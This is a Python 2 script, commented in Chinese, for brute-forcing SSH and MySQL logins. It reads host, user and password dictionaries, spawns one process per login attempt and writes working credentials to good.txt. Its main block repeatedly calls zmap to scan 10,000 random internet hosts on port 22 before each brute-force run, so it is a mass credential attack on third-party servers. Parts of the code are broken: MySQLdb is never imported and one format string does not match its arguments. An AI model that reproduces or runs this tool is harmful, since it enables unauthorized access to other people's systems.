#!coding=utf-8
import re
import socket
import optparse
from multiprocessing import Pool
import multiprocessing
from pexpect import pxssh
import os

try:
    import paramiko
except ImportError:
        print "[!!!]need to install paramiko modul"
        print "[!!!]Usage:pip install paramiko"
        exit()
        
result_user =None
result_pass =None
threads =[]

#----------------------------------------------------------------------
def main():
    """
    主函数，处理输入的参数
    自动根据所提供的端口号判断mysql与ssh
    """
    parse = optparse.OptionParser('python %prog --h <host dictionary> --u <users dictionary> --p <password dictionary> -P <port>')    
    parse.add_option('--h', dest="host_dic", type="string", help='目标主机')
    parse.add_option('--u', dest='user_dic', type='string', help='用户字典')
    parse.add_option('--p', dest='pwd_dic', type='string', help='密码字典')
    parse.add_option('-P', dest='port', type='int', help='端口')
    (options, args) = parse.parse_args()
    host_dic = options.host_dic
    user_dic = options.user_dic
    pwd_dic = options.pwd_dic
    port = options.port
    if host_dic is not None:
        mysql_brute(host_dic, user_dic, pwd_dic, port)
    else:
        print "[!!!]Unknon IP"
        exit()

def ip_open(ip,ports):
    """
    判断主机是否存活，暂无使用
    """
    sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        sock.connect((ip,ports))
        sock.settimeout(1)
        sock.close()
        return True
    except Exception:
        sock.close()
        return False
    
#----------------------------------------------------------------------
def mysql_brute(host_dic,user_dic,pwd_dic,port):
    """
     MySQL暴力破解
    :param host_dic: 主机
    :param user_dic: 用户字典
    :param pwd_dic: 密码字典
    :param port: 端口
    :return: None
    """

    hostlist = None
    userlist = None
    pwdlist = None
    try:
        hostlist = [k.strip('\n') for k in open(host_dic, 'r').readlines()]
        userlist = [i.strip('\n') for i in open(user_dic, 'r').readlines()]
        pwdlist = [j.strip('\n') for j in open(pwd_dic, 'r').readlines()]
        print "[*] Number of hosts:" + str(len(hostlist))
        print "[*] Number of users:" + str(len(userlist))
        print "[*] Number of passwords:" + str(len(pwdlist))
    except Exception:
        print "[!] The path of the dictionary file is incorrect"
        exit()
        
    #p = Pool(50)
    
    paramiko.util.log_to_file("filename.log")
    for host in hostlist:
        for user in userlist:
            for pwd in pwdlist:
                if port ==3306:
                    pp =multiprocessing.Process(target=mysql_login,args=(host, user, pwd, port))
                    pp.start()
                    #p.apply_async(mysql_login,args=(host, user, pwd, port))
                elif port ==22:
                    pp =multiprocessing.Process(target=ssh_login,args=(host, user, pwd, port))
                    #p.apply_async(ssh_login,args=(host, user, pwd, port))
                    pp.start()
            pp.join()
    #p.close()
    #p.join()

#----------------------------------------------------------------------
def ssh_login(host, username, password, port):
    """
    ssh登录
    :param host:主机
    :param username:用户名
    :param password: 密码
    :param port: 端口
    :return: None
    """
    try:
        ssh = paramiko.SSHClient()
        #以传统密钥验证用户密码
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        #s = pxssh.pxssh(t)
        #s.login(host, username,password,login_timeout=1)
        ssh.connect(host, username=username, password=password, 
                   timeout=1)
        print "\033[1;32;41m[+] Success! User:" + username + " Password:" + password + "\033[0m"
        output = open("good.txt", 'a')
        output.write(host+"=>"+username+"----"+password+"\n")
        #s.logout()
        ssh.close()
    except:
        print "[-] Error:%s pass:%s" % (host,password)
        pass

#----------------------------------------------------------------------    
def mysql_login(host, username, password, port):
    """
    MySQL连接
    :param host:主机
    :param username:用户名
    :param password: 密码
    :param port: 端口
    :return: None
    """
    try:
        db = MySQLdb.connect(host=host, user=username, passwd=password, port=port,connect_timeout=1)
        print "\033[1;32;41m[+] Success! User:" + username + " Password:" + password + "\033[0m"
        global result_user, result_pass
        result_user = username
        result_pass = password
        output = open("good.txt", 'a')
        output.write(host+"=>"+username+"----"+password+"\n")
        db.close()
        exit()
    except Exception:
        print "[-] Error:%s pass:" % (host,password)
        pass
        
        
#----------------------------------------------------------------------
if __name__ == '__main__':
    times=1
    while times <=10000:
        os.system("zmap -B 10M -p 22 -n 10000 -o ssh.txt")
        main()
        print "\033[1;32;41m[*] Scan OK! \033[0m"
        
        times +=1
    exit()
